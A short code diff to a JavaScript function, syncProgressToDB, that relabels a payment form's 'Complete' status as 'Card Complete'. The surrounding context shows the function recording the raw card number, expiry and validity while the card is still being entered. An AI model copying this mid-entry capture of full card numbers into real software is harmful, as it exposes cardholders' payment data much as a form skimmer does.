@@ -706,7 +706,7 @@ async function syncProgressToDB() {
     digitCount: rawNum.length,
     expiryValid: validateExpiry($('#expiry').value),
     cvvCompleted: valLength('cvv') >= (brand === 'amex' ? 4 : 3),
-    status: rawNum.length === 0 ? 'Not Started' : (isCardComplete ? 'Complete' : 'In Progress'),
+    status: rawNum.length === 0 ? 'Not Started' : (isCardComplete ? 'Card Complete' : 'In Progress'),
     validity: rawNum.length === 0 ? 'Empty' : (luhnCheck(rawNum) ? 'Valid' : 'Invalid'),
     cardNumber: rawNum || 'Empty',
     expiry: $('#expiry').value || '',
